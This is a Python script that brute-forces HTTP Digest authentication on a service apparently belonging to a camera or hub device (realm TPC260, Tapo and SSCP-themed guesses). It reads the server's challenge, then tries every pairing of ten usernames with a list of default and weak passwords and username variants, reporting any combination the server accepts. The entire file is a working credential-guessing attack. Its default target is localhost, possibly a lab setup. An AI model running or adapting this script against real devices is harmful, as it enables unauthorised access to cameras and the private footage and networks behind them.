import http.client, hashlib, itertools, os, re, secrets

HOST=os.environ.get("VHTTPD_HOST", "127.0.0.1"); PORT=int(os.environ.get("VHTTPD_PORT", "8800")); URI="/preview"
def h256(s): return hashlib.sha256(s.encode()).hexdigest()

def get_with_digest(user, pw, realm, nonce, opaque, uri=URI, method="GET", nc="00000001", cnonce="0a4f113b"):
    ha1=h256(f"{user}:{realm}:{pw}")
    ha2=h256(f"{method}:{uri}")
    resp=h256(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}")
    auth=(f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", '
          f'qop=auth, nc={nc}, cnonce="{cnonce}", response="{resp}", opaque="{opaque}", algorithm=SHA-256')
    c=http.client.HTTPConnection(HOST,PORT,timeout=8)
    c.request(method,uri,headers={"Authorization":auth,"Connection":"close"})
    r=c.getresponse(); d=r.read(); hs=dict(r.getheaders()); c.close()
    return r.status,hs,d

def challenge():
    c=http.client.HTTPConnection(HOST,PORT,timeout=8)
    c.request("GET",URI,headers={"Connection":"close"})
    r=c.getresponse(); d=r.read(); wa=dict(r.getheaders()).get('Www-Authenticate',''); c.close()
    m=dict(re.findall(r'(\w+)="?([^",]+)"?',wa))
    return wa,m

wa,m=challenge()
print("challenge:",wa)
realm=m.get('realm','TPC260'); nonce=m.get('nonce'); opaque=m.get('opaque','')
users=["hub_primary_2","camera_acc","admin","operator","viewer","root","sscp","guest","user","camera"]
base=["","password","123456","admin","admin123","sscp","SSCP","SSCP2026","SSCP@2026","tpc260","TPC260","TPC260@2026","SSCP-CAM","camera","Camera@2026","Tapo","SSCP-0001","1.0.3","V1.6","public","readonly","read_only","view","viewer123","camera123","changeme","letmein","secret","hub_primary_2","camera_acc"]
hits=[]
count=0
for u in users:
    pws=set(base)|{u,u.lower(),u.upper(),u.capitalize(),u+"123",u+"@123",u+"@2026",u+"2026"}
    for p in pws:
        st,hs,d=get_with_digest(u,p,realm,nonce,opaque)
        count+=1
        if st!=401:
            hits.append((u,p,st,len(d),hs.get('Content-Type'),d[:80]))
            print("HIT",u,repr(p),st,len(d),hs.get('Content-Type'),d[:80])
print("tested",count,"hits",len(hits))
